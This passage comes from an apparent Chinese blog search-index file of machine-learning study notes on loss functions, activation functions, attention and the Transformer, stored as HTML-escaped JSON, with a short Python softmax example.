id=\"2-MSE（Mean-Square-Error，均方误差）\"><a href=\"#2-MSE（Mean-Square-Error，均方误差）\" class=\"headerlink\" title=\"2. MSE（Mean Square Error，均方误差）\"></a>2. MSE（Mean Square Error，均方误差）</h3><p>均方误差（Mean Square Error,MSE）是回归损失函数中最常用的误差，它是预测值f(x)与目标值y之间差值平方和的均值，也称为 <strong>L2 Loss 损失函数</strong>，其公式如下所示：<br>$$ MSE &#x3D; \\frac{1}{N} \\sum_{i&#x3D;1}^{N} (y_i-f(x_i))^2 $$</p>\n<h3 id=\"3-Huber-Loss\"><a href=\"#3-Huber-Loss\" class=\"headerlink\" title=\"3. Huber Loss\"></a>3. Huber Loss</h3><p>MSE 和 MAE 各有优点和缺点，Huber 提出了一个综合二者特点的改进方案，公式如下：<br>$$ Loss(y,f(x)) &#x3D;<br>\\begin{cases}<br>    \\frac {1}{2} (y-f(x))^2, &amp; \\vert y-f(x) \\vert &lt; \\delta \\\\<br>    \\delta \\vert y-f(x) \\vert - \\frac {1}{2} \\delta ^2, &amp; \\vert y-f(x) \\vert \\geqslant \\delta<br>\\end{cases}<br>$$</p>\n<p>Huber Loss 包含了一个超参数$\\delta$，$\\delta$ 的大小决定了 Huber Loss 对 MSE 和 MAE 的侧重性，使其同时具备两者的优点，减小了对离群点的敏感度问题，还实现了处处可导的功能。</p>\n<ul>\n<li>当$\\vert y−f(x) \\vert &lt; \\delta$ 时，变为 MSE，梯度逐渐减小，保证模型更精确地得到全局最优解</li>\n<li>当$\\vert y−f(x) \\vert \\geqslant \\delta$时，则变成类似于 MAE，梯度一直近似为 $\\delta$ ，保证了模型的快速收敛</li>\n</ul>\n<p>通常来说，超参数 $\\delta$ 可以通过交叉验证选取最佳值。下面分别取 $\\delta$ &#x3D; 3、$\\delta$ &#x3D; 1.5，绘制相应的 Huber Loss，如下图所示：</p>\n<p><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/regression.png\" alt=\"回归类\"></p>\n<h3 id=\"4-Smooth-L1（平滑之后的L1）\"><a href=\"#4-Smooth-L1（平滑之后的L1）\" class=\"headerlink\" title=\"4. Smooth L1（平滑之后的L1）\"></a>4. Smooth L1（平滑之后的L1）</h3><p>根据 <a href=\"https://pytorch.org/docs/stable/generated/torch.nn.SmoothL1Loss.html#smoothl1loss\">PyTorch SmoothL1Loss 函数</a>的定义，其公式为：<br>$$ Loss(y,f(x)) &#x3D;<br>\\begin{cases}<br>    \\frac{1}{2\\delta}(y-f(x))^2, &amp; \\vert y - f(x) \\vert &lt; \\delta  \\\\<br>    \\vert y-f(x) \\vert - \\frac {1}{2}\\delta, &amp; \\vert y - f(x) \\vert \\geqslant \\delta<br>\\end{cases}<br>$$</p>\n<p>Smooth L1 Loss 与 Huber Loss 的效果差不多，只是构造函数有所区别。</p>\n<h2 id=\"三、简要分析\"><a href=\"#三、简要分析\" class=\"headerlink\" title=\"三、简要分析\"></a>三、简要分析</h2><h3 id=\"1-面向分类的损失函数通常使用交叉熵，为什么不使用均方差损失？\"><a href=\"#1-面向分类的损失函数通常使用交叉熵，为什么不使用均方差损失？\" class=\"headerlink\" title=\"1. 面向分类的损失函数通常使用交叉熵，为什么不使用均方差损失？\"></a>1. 面向分类的损失函数通常使用交叉熵，为什么不使用均方差损失？</h3><p>在统计学中，平均平方误差是对于无法观察的参数 $\\theta$ 的一个估计函数，通常与高斯分布（正态分布）相关联。例如，线性回归模型通常假设数据的误差（预测值与实际值之间的差异）是随机的，并且遵循均值为零、恒定方差的正态分布。</p>\n<p>面向分类问题的结果，通常是一个离散的标签值（二分类就是[0,1]），此时用正态分布来描述误差显然是不合适的，因此我们直接衡量预测概率与实际标签之间的差异，即关注于模型预测的概率分布是否接近实际的标签分布，也就是极大似然估计法，其等价于交叉熵法。</p>\n<h3 id=\"2-面向分类的损失函数\"><a href=\"#2-面向分类的损失函数\" class=\"headerlink\" title=\"2. 面向分类的损失函数\"></a>2. 面向分类的损失函数</h3><p><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/family2.png\" alt=\"family2\"></p>\n<h3 id=\"3-面向回归的损失函数\"><a href=\"#3-面向回归的损失函数\" class=\"headerlink\" title=\"3. 面向回归的损失函数\"></a>3. 面向回归的损失函数</h3><ul>\n<li>从梯度的求解以及收敛上，MSE 是优于 MAE 的。MSE 处处可导，而且梯度值也是动态变化的，能够快速的收敛；而 MAE 在零点处不可导，且其梯度保持不变。对于很小的损失值其梯度也很大，在深度学习中，就需要使用变化的学习率，在损失值很小时降低学习率。</li>\n<li>对离群（异常）值的处理上，MAE 要明显好于 MSE 。如果离群点（异常值）需要被检测出来，则可以选择 MSE 作为损失函数；如果离群点只是当做受损的数据处理，则可以选择 MAE 作为损失函数。</li>\n</ul>\n<h3 id=\"4-损失函数的全家福\"><a href=\"#4-损失函数的全家福\" class=\"headerlink\" title=\"4. 损失函数的全家福\"></a>4. 损失函数的全家福</h3><p><img src=\"/2024/08/02/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0/family.jpg\" alt=\"Group\"></p>\n<blockquote>\n<p>注意！此图的 Smooth L1 Loss 函数定义有错误，PyTorch 的定义应该是准确的。</p>\n</blockquote>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://cloud.tencent.com/developer/article/2322229\">神经网络中的损失函数</a></li>\n<li><a href=\"https://www.cvmart.net/community/detail/4879\">一文看尽深度学习中的各种损失函数</a></li>\n<li><a href=\"https://blog.csdn.net/nefetaria/article/details/111238515\">MSE, MAE, Huber loss详解</a></li>\n<li><a href=\"https://datawhalechina.github.io/thorough-pytorch/%E7%AC%AC%E4%B8%89%E7%AB%A0/3.6%20%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0.html\">深入浅出PyTorch - 损失函数</a></li>\n<li><a href=\"https://blog.csdn.net/chao_shine/article/details/89925762\">交叉熵损失函数（cross-entropy loss function）原理及Pytorch代码简介</a></li>\n<li><a href=\"https://www.cnblogs.com/massquantity/p/8964029.html\">常见回归和分类损失函数比较</a></li>\n<li><a href=\"https://www.cnblogs.com/cy0628/p/13925930.html\">机器学习常用分类的损失函数</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/77686118\">机器学习常用损失函数小结</a></li>\n<li><a href=\"https://kezhi.tech/e295e676.html\">PyTorch中的CrossEntropyLoss与交叉熵计算不一致</a></li>\n<li><a href=\"https://blog.csdn.net/hello_dear_you/article/details/128892040\">分类损失函数的推导</a></li>\n</ul>\n<h3 id=\"视频讲解\"><a href=\"#视频讲解\" class=\"headerlink\" title=\"视频讲解\"></a>视频讲解</h3><ul>\n<li><a href=\"https://www.bilibili.com/video/BV15V411W7VB/?spm_id_from=333.788&vd_source=735a6376f6214c7b974a1074096ba0fa\">“交叉熵”如何做损失函数？打包理解“信息量”、“比特”、“熵”、“KL散度”、“交叉熵”</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1Y64y1Q7hi/?spm_id_from=333.788&vd_source=735a6376f6214c7b974a1074096ba0fa\">“损失函数”是如何设计出来的？直观理解“最小二乘法”和“极大似然估计法”</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1p5411c7nZ/?spm_id_from=333.337.search-card.all.click&vd_source=735a6376f6214c7b974a1074096ba0fa\">常见的损失函数</a></li>\n<li><a href=\"https://paulxiong.medium.com/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E7%9A%84%E8%A7%A3%E9%87%8A-c2b6f165c842\">损失函数的解释</a></li>\n</ul>\n"},{"title":"大模型学习笔记之二：激活函数","url":"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>神经网络中的每个神经元节点接受上一层神经元的输出值作为本神经元的输入值，并将输入值传递给下一层，输入层神经元节点会将输入属性直接传递到下一层（隐层或输出层）。在多层神经网络中，上层节点的输出和下层节点的输入之间具有一个函数关系，这个函数称为激活函数（activation function）。</p>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/cell.png\" alt=\"cell\"></p>\n<p>$\\sum\\limits_{i}{w_{i}x_{i}+b}$ 是线形组合部分，$f()$ 部分就是激活函数，核心用途是为神经元加入非线性因素！</p>\n<blockquote>\n<p>从哲学的角度看，线性组合解决的是<strong>描述问题</strong>，激励函数解决的是<strong>判断问题</strong>，就是价值观！</p>\n</blockquote>\n<p>在神经网络中，如果不对上一层结点的输出做非线性转换的话（即：激活函数为$f(x)&#x3D;x$），再深的网络也是线性模型，只能把输入线性组合再输出，不能学习到复杂的映射关系，就是最原始的感知机（perceptron），那么网络的逼近能力就相当有限，因此需要使用激活函数提供非线性转换，这样深层神经网络表达能力就更加强大了，几乎可以逼近任意函数。</p>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/vs.png\" alt=\"vs\"></p>\n<p>设计一个合格的激活函数，必须满足以下性质：</p>\n<ul>\n<li>非线性：这是激活函数的基本要求，目的就是提供<strong>超越</strong>线形组合的表达能力</li>\n<li>可微性：当优化方法是基于梯度的时候，这个性质是必须的。<blockquote>\n<p>连续性是指函数在某一点的极限值等于该点的函数值；<br>可微性是指函数在某一点附近的变化率可以表示为该点的一个线性变换；<br>可导性是指函数在某一点存在切线，且切线的斜率是确定的。<br>注意！<strong>可微一定可导，可微一定连续，但反之并不一定！</strong></p>\n</blockquote>\n</li>\n<li>单调性：当激活函数是单调的时候，单层网络能够保证是凸函数</li>\n<li>$f(x) \\approx x$：当激活函数满足这个性质的时候，如果参数的初始化是 random 的很小的值，那么神经网络的训练将会很高效；如果不满足这个性质，那么就需要很用心的去设置初始值</li>\n<li>有限输出：当激活函数的输出值是有限的时候，基于梯度的优化方法会更加稳定，因为特征的表示受有限权值的影响更显著；当激活函数的输出是无限的时候，模型的训练会更加高效，不过在这种情况下，一般需要更小的 learning rate。</li>\n</ul>\n<p>根据输入变量的数量，激活函数分为单变量输入$f(x)$ 和 多变量输入$f(x_1,..x_n)$。</p>\n<h2 id=\"二、单变量输入的激活函数\"><a href=\"#二、单变量输入的激活函数\" class=\"headerlink\" title=\"二、单变量输入的激活函数\"></a>二、单变量输入的激活函数</h2><h3 id=\"1-Sigmoid（S型函数）\"><a href=\"#1-Sigmoid（S型函数）\" class=\"headerlink\" title=\"1. Sigmoid（S型函数）\"></a>1. Sigmoid（S型函数）</h3><p>Sigmoid 函数把一个实数（输入的连续实值）压缩到 0 到 1 之间，当输入的数字非常大的时候，结果会接近 1（完全被激活），当输入非常大的负数时，则会得到接近 0 （几乎死掉了），很好地解释了神经元受到刺激后是否被激活，并向后传递的场景，因此在早期的神经网络中使用非常普遍！</p>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/Sigmoid.png\" alt=\"sigmoid\"></p>\n<p>不过，其在近期深度学习的应用中已经很少使用，主要存在以下缺点：</p>\n<ul>\n<li>当神经网络的层数很多时，如果每一层的激活函数都采用 Sigmoid 函数的话，就会产生梯度弥散和梯度爆炸的问题，其中梯度爆炸发生的概率非常小，而<strong>梯度消失</strong>的发生概率比较大。</li>\n<li>计算量大，因为解析式中含有幂函数，对于规模比较大的深度网络，这会较大的增加训练时间</li>\n<li>Sigmoid 函数的输出均值不是 0 ，这是不可取的</li>\n</ul>\n<blockquote>\n<p>zero-centered 问题：如果当前参数（$w_0$, $w_1$）的最佳优化方向是 （$+d_0$, $-d_1$），则根据反向传播计算公式，我们希望 $x_0$ 和 $x_1$ 符号相反，但是如果上一级神经元采用 Sigmoid 函数作为激活函数，其输出值恒为正，那么我们无法进行更快的参数更新，只能走 Z 字形逼近最优解。</p>\n</blockquote>\n<h3 id=\"2-Tanh（Hyperbolic-tangent，双曲正切函数）\"><a href=\"#2-Tanh（Hyperbolic-tangent，双曲正切函数）\" class=\"headerlink\" title=\"2. Tanh（Hyperbolic tangent，双曲正切函数）\"></a>2. Tanh（Hyperbolic tangent，双曲正切函数）</h3><p>在数学中，双曲正切 tanh 是由双曲正弦和双曲余弦这两个基本双曲函数推导而来。<br>$$<br>tanh(x)&#x3D;\\dfrac{(e^x-e^{-x})}{(e^x+e^{-x})}<br>$$</p>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/tanh.png\" alt=\"tanh\"></p>\n<p>与 Sigmoid 相比，tanh 函数有了明显改进，但有些问题依然存在：</p>\n<ul>\n<li>tanh 函数输出位于[-1,1]，解决了 Sigmoid 函数输出的 zero-centered 问题</li>\n<li>收敛速度比 Sigmoid 更快，减少迭代次数，梯度消失问题有所缓解，但仍然存在！</li>\n<li>计算量仍然加大，因为解析式中仍然包含幂函数！</li>\n</ul>\n<h3 id=\"3-ReLU（Rectified-Linear-Unit-线形整流函数）\"><a href=\"#3-ReLU（Rectified-Linear-Unit-线形整流函数）\" class=\"headerlink\" title=\"3. ReLU（Rectified Linear Unit, 线形整流函数）\"></a>3. ReLU（Rectified Linear Unit, 线形整流函数）</h3><p>针对 Sigmoid 函数和 tanh 的缺点，提出了一种<strong>斜坡</strong>函数，就是 ReLU函数。</p>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/ReLU.png\" alt=\"R\"></p>\n<p>ReLU 是目前最受欢迎的激活函数！突出优点是：</p>\n<ul>\n<li>解决了梯度消失（gradient vanishing）问题，仅在正区间部分</li>\n<li>计算速度快，求导方便，只需要判断输入是否大于0</li>\n<li>收敛速度远远大于 Sigmoid函数和 tanh 函数，可以加速网络训练</li>\n</ul>\n<p>也有一些缺点：</p>\n<ul>\n<li>由于负数部分恒为零，有些场景下比较脆弱。即如果变量的更新太快，还没有找到最佳值就进入小于零的分段，就会使得梯度变为零，神经元就直接死掉了（无法更新）</li>\n<li>输出不是 zero-centered</li>\n</ul>\n<p>解决方法是可以采用 Xavier 初始化方法，以及避免将 learning rate 设置太大或使用 adagrad 等自动调节 learning rate 的算法。<br>为了改进 ReLU 的缺点，陆续出现了许多的变种，如下图：<br><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/LU.png\" alt=\"LUs\"></p>\n<h4 id=\"Leak-ReLU（Leakly-Rectified-Linear-Unit，带泄露线性整流函数）\"><a href=\"#Leak-ReLU（Leakly-Rectified-Linear-Unit，带泄露线性整流函数）\" class=\"headerlink\" title=\"Leak-ReLU（Leakly Rectified Linear Unit，带泄露线性整流函数）\"></a>Leak-ReLU（Leakly Rectified Linear Unit，带泄露线性整流函数）</h4><p>为了避免 ReLU 存在的梯度消失问题，提出了将 ReLU 的前半段设为 $ax$ 而非 0，即当神经元处于非激活状态时，允许一个非0的梯度存在，a 可由方向传播算法学出来，通常设置为 0.01。也称为 LReLU 。</p>\n<p>$$f(x)&#x3D;max(ax, x)$$</p>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/L-ReLU.png\" alt=\"R\"></p>\n<p>理论上来说，Leaky ReLU 具备 ReLU的所有优点，外加不会有 Dead ReLU 问题，但是在实际操作当中，并没有完全证明 Leaky ReLU 总是好于 ReLU。</p>\n<h4 id=\"RReLU（Random-Rectified-Linear-Unit，随机线性整流单元）\"><a href=\"#RReLU（Random-Rectified-Linear-Unit，随机线性整流单元）\" class=\"headerlink\" title=\"RReLU（Random Rectified Linear Unit，随机线性整流单元）\"></a>RReLU（Random Rectified Linear Unit，随机线性整流单元）</h4><p>Leaky ReLU的一个变体。在 PReLU中，负值的斜率在<strong>训练</strong>中是随机的，在之后的测试中就变成了固定的了。</p>\n<h3 id=\"4-ELU（Exponential-Linear-Unit，指数线性函数）\"><a href=\"#4-ELU（Exponential-Linear-Unit，指数线性函数）\" class=\"headerlink\" title=\"4. ELU（Exponential Linear Unit，指数线性函数）\"></a>4. ELU（Exponential Linear Unit，指数线性函数）</h3><p>一个 ReLU 的进化版，正数部分是和 ReLU 完全相同的 $x$ ，但负数部分是 $\\alpha(e^x-1)$ 。</p>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/ELU.png\" alt=\"ELU\"></p>\n<p>ELU 试图将激活函数的平均值接近零，从而加速学习的速率。同时它融合了 Sigmoid 和 ReLU，左侧具有软饱和性，右侧无饱和性，则可以通过正值的标识来避免梯度消失的问题。根据一些研究，ELU 分类精确度是高于 ReLUs的。</p>\n<h4 id=\"SELU（Scaled-Exponential-Linear-Unit，扩展指数线形函数）\"><a href=\"#SELU（Scaled-Exponential-Linear-Unit，扩展指数线形函数）\" class=\"headerlink\" title=\"SELU（Scaled Exponential Linear Unit，扩展指数线形函数）\"></a>SELU（Scaled Exponential Linear Unit，扩展指数线形函数）</h4><p>一个 ELU 的变种，把每一个值的前面都乘上一个系数，即：正数部分为 $\\lambda x$ ，负数部分为 $\\lambda\\alpha(e^x-1)$ 。</p>\n<p><a href=\"https://github.com/bioinf-jku/SNNs\">有关数学推导</a>表明，最佳参数为：$\\alpha$&#x3D;1.67326324，$\\lambda$&#x3D;1.050700987。</p>\n<h3 id=\"5-其他\"><a href=\"#5-其他\" class=\"headerlink\" title=\"5. 其他\"></a>5. 其他</h3><p>除了上述流行的激活函数，还有一些可选项：</p>\n<ul>\n<li>ReLU6：就是普通的 ReLU，但是限制最大输出值为 6，适配移动端设备 float16 的低精度。</li>\n<li>SReLU（Sigmoid Rectified Linear Unit，S型线形整流函数）：有多个复杂变种，此处略。</li>\n<li>正弦函数：$f(x)&#x3D;sin(x)$</li>\n<li>高斯函数：$f(x)&#x3D;e^{-x^2}$</li>\n</ul>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/group.gif\" alt=\"Group\"></p>\n<h2 id=\"三、多变量输入的激活函数\"><a href=\"#三、多变量输入的激活函数\" class=\"headerlink\" title=\"三、多变量输入的激活函数\"></a>三、多变量输入的激活函数</h2><h3 id=\"1-Softmax-函数\"><a href=\"#1-Softmax-函数\" class=\"headerlink\" title=\"1. Softmax 函数\"></a>1. Softmax 函数</h3><p>Softmax 是一种激活函数，将一个数值向量<strong>归一化</strong>为一个概率分布向量，且各个概率之和为 1。</p>\n<p>$$ Softmax(z_i)&#x3D;\\frac {e^{z_i}} {\\sum\\limits_{j&#x3D;1}^{n} e^{z_j}} $$</p>\n<p>正常的 max 函数仅输出最大值，但 Softmax 函数确保较小的值具有较小的概率，并且不会直接丢弃。可以认为它是    argmax 函数的概率版本或“soft”版本。<br>Softmax 函数的分母结合了原始输出值的所有因子，这意味着 Softmax 函数获得的各种概率彼此相关。</p>\n<p><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/softmax.png\" alt=\"softmax\"></p>\n<p>Softmax 通常作为神经网络的<strong>最后</strong>一层，用于多分类问题的输出，它将多个神经元的输出，映射到（0,1）区间内，可以看成概率来理解，从而来进行多分类，常常和交叉熵损失函数一起结合使用。</p>\n<p>下面是使用Python进行函数计算的示例代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\">z = [<span class=\"number\">1.0</span>, <span class=\"number\">2.0</span>, <span class=\"number\">3.0</span>, <span class=\"number\">4.0</span>, <span class=\"number\">1.0</span>, <span class=\"number\">2.0</span>, <span class=\"number\">3.0</span>]</span><br><span class=\"line\">z_exp = [math.exp(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> z]  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(z_exp)  <span class=\"comment\"># Result: [2.72, 7.39, 20.09, 54.6, 2.72, 7.39, 20.09] </span></span><br><span class=\"line\">sum_z_exp = <span class=\"built_in\">sum</span>(z_exp)  </span><br><span class=\"line\"><span class=\"built_in\">print</span>(sum_z_exp)  <span class=\"comment\"># Result: 114.98 </span></span><br><span class=\"line\">softmax = [<span class=\"built_in\">round</span>(i / sum_z_exp, <span class=\"number\">3</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> z_exp]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(softmax)  <span class=\"comment\"># Result: [0.024, 0.064, 0.175, 0.475, 0.024, 0.064, 0.175]</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Maxout-函数\"><a href=\"#2-Maxout-函数\" class=\"headerlink\" title=\"2. Maxout 函数\"></a>2. Maxout 函数</h3><p>Maxout 是 Goodfellow 在 2013 年提出的一个新的激活函数，相比于其它的激活函数，Maxout 本身是需要参数的，参数可以通过网络的反向传播得到学习。</p>\n<p>$$f(x)&#x3D;\\max(w_1x^T + b_1, w_2x^T + b_2, …, w_nx^T + b_n)$$</p>\n<p>Maxout 的本质是<strong>分段线性拟合</strong>，理论上可以拟合<strong>任意的凸函数</strong>；同时，由于其应用了 max 函数，又具备非线形的特征，因此比其它激活函数有着更好的性能的应用，换个角度看，如果 w 和 b 都设置为 0 ，就转换为 ReLU 函数。<br><img src=\"/2024/08/01/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0/maxout.png\" alt=\"maxout\"></p>\n<p>Maxout 连接与普通的全连接并无区别，之后每两个单元<strong>连接</strong>到一个单元上，当然，这里不是真的连接，因为该条线上并不涉及参数，那么如何从两个单元得到一个单元的值呢？其实只需要比较两个单元的值即可，大的值就是 MaxOut。</p>\n<p>Maxout 继承了 RELU 的优点而且没有死区，但是需要 2 次线性映射运算，因此计算量也会翻倍。</p>\n<h2 id=\"四、简要分析\"><a href=\"#四、简要分析\" class=\"headerlink\" title=\"四、简要分析\"></a>四、简要分析</h2><h3 id=\"1-Sigmoid-和-Softmax\"><a href=\"#1-Sigmoid-和-Softmax\" class=\"headerlink\" title=\"1. Sigmoid 和 Softmax\"></a>1. Sigmoid 和 Softmax</h3><ul>\n<li>Sigmoid 函数将模型的输出转化为概率形式，即将任意实数映射到（0，1）区间，从而解决了归一化问题</li>\n<li>Softmax 是 Sigmoid 的扩展形式，即 Sigmoid 是 Softmax 在二分类情况下的特例。即：<br>  $$Softmax([z,0]) &#x3D; [\\frac {e^z}{e^z+1}, \\frac {1}{e^z+1}]$$</li>\n<li>使用 Sigmoid &amp; Softmax &#x3D; 选择了<strong>最大熵原理</strong>，因此模型的中间层可能使用其他激活函数（为了解决梯度消失问题），但最终输出必然使用 Softmax</li>\n</ul>\n<p>请参见<a href=\"https://blog.csdn.net/Kevin_Carpricron/article/details/124123134\">用最大熵搞懂Softmax</a></p>\n<h3 id=\"2-模型的温度\"><a href=\"#2-模型的温度\" class=\"headerlink\" title=\"2. 模型的温度\"></a>2. 模型的温度</h3><p>对于 Softmax 函数，我们可以使用不同的基底参数，其结果仍然服从归一化概率分布，但数值分布发生了变化。<br>$$ Softmax(z_i)&#x3D;\\frac {e^{z_i&#x2F;T}} {\\sum\\limits_{j&#x3D;1}^{n} e^{z_j&#x2F;T}} $$</p>\n<p>其中，$z_i$ 是模型输出的第 $i$ 个元素，$T$ 称为<strong>温度调整（Temperature Scaling）</strong>参数，默认值为 1。</p>\n<ul>\n<li>温度 $T$ 较低时，Softmax 输出的概率分布更加尖锐，即一个值占主导地位（结果的确定性更高）；</li>\n<li>温度 $T$ 较高时，分布更加平坦，即类别之间的概率差异减小（系统熵增加，随机性更高）。</li>\n<li>在实际应用和计算中，$T$ 不能设置为 0（分母为零没有意义），但可以是一个非常小的数字（ Pytorch 通常设置 $eps&#x3D;1e^{-6}$），此时函数表现行为就是最大值的概率为100%</li>\n</ul>\n<h3 id=\"3-函数选择的基本策略\"><a href=\"#3-函数选择的基本策略\" class=\"headerlink\" title=\"3. 函数选择的基本策略\"></a>3. 函数选择的基本策略</h3><ol>\n<li>首先尝试 ReLU，速度快，但是要注意训练的状态</li>\n<li>如果 ReLU 效果欠佳，尝试 Leaky ReLU 或者 Maxout 等变种</li>\n<li>最好不用 Sigmoid 函数，可以尝试 tanh 函数，但通常其效果比不上 ReLU 和 maxout</li>\n<li>Sigmoid tanh 在 RMM（LSTM  注意力机制等）结构中有所应用，作为门控或者概率值</li>\n<li>在浅层神经网络中，如不超过四层，可选择使用多种激励函数，没有太大的影响</li>\n<li>如果是使用 ReLU，那么一定要小心设置 learning rate，而且要注意，不要让网络出现很多“dead”神经元，如果这个问题不好解决，那么可以试试 Leaky ReLU ,PReLU , 或者 Maxout。</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E6%BF%80%E6%B4%BB%E5%87%BD%E6%95%B0\">激活函数 - Wiki</a></li>\n<li><a href=\"https://www.cnblogs.com/wj-1314/p/12015278.html\">深度学习笔记——常用的激活（激励）函数</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1558355\">从ReLU到GELU，一文概览神经网络的激活函数</a></li>\n<li><a href=\"https://nyakku.moe/posts/2019/07/01/maxout.html\">Maxout 的简单理解与实现</a></li>\n</ul>\n"},{"title":"大模型学习笔记之五：注意力机制","url":"/2024/08/04/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%BA%94%EF%BC%9A%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/","content":"<p>传统神经网络在特征提取和强化方面存在不足，注意力机制，不仅减少了层次深度，还有效提高了系统精度，同时捕获了远程依赖信息，因此深度学习及神经网络中得以迅速发展。</p>\n<ol>\n<li>注意力机制<strong>直接建立输入与输出之间的依赖关系</strong>，而不再通过循环，从而能够聚焦关键信息而忽略不相关的信息，并行化程度和运行速度显著提高。</li>\n<li>传统神经网络在输入长度增加时性能下降，而注意力机制能够有效地建模<strong>可变长度的序列数据</strong>，从而提高系统的性能。</li>\n<li>传统神经网络在处理<strong>不合理的输入顺序</strong>时计算效率低下，而注意力机制能够减少这种效率问题。</li>\n</ol>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://pdf.hanspub.org/MOS20240100000_68041811.pdf\">注意力机制在图神经网络模型中的算法研究</a></li>\n</ul>\n"},{"title":"大模型学习笔记之六：Transformer","url":"/2024/08/05/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AD%EF%BC%9ATransformer/","content":"<p>Transformer 架构于 2017 年在 <a href=\"https://arxiv.org/pdf/1706.03762\">Attention Is All You Need</a> 